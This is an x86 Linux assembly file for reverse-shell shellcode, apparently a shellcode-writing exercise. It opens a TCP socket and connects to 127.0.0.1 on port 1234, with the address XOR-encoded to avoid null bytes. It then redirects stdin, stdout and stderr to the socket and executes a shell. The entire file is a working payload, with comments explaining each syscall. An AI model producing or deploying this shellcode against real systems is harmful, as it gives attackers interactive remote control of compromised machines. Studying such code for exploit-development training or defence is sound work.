BITS 32

; socketcall(SYS_SOCKET, (AF_INET,SOCK_STREAM,IP_PROTO))
; socketcall(SYS_CONNECT, (sockfd,struct sockaddr*,addrlen)
; dup2(sockfd, std*)
; execve('/bin/bash',0,0)

; socket syscall
; syscall number
push 0x66
pop eax
; SYS_SOCKET=1
xor ebx,ebx
inc ebx
; arg struct
; IP_PROTO=0
xor edx,edx
push edx
; SOCK_STREAM=1
push ebx
; AF_INET=2
push 0x2
; struct address
mov ecx,esp
; syscall
int 0x80
xchg eax,edx

; connect syscall
; syscall number
mov al,0x66
; SYS_CONNECT=3
push 0x3
pop ebx
; sockaddr struct
; sin_addr=inet_aton('127.0.0.1'), XORed with 0xffffffff
mov ecx,0xfeffff80
xor ecx,0xffffffff
push ecx
; sin_port=1234 (big endian)
push word 0xd204
; AF_INET=2
push word 0x2
mov ecx,esp
; arg struct
; addrlen
push 0x10
; struct sockaddr
push ecx
; sockfd
push edx
mov ecx,esp
; syscall
int 0x80

; dup2 syscall loop
; init fd to 0 for looping
push 0x2
pop ecx
; sockfd
mov ebx,edx
_loop:
; syscall number
mov al,0x3f
int 0x80
dec ecx
jns _loop

; execve syscall
xor eax,eax
push eax
mov al, 0xb
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx, ecx
xor edx, edx
int 0x80
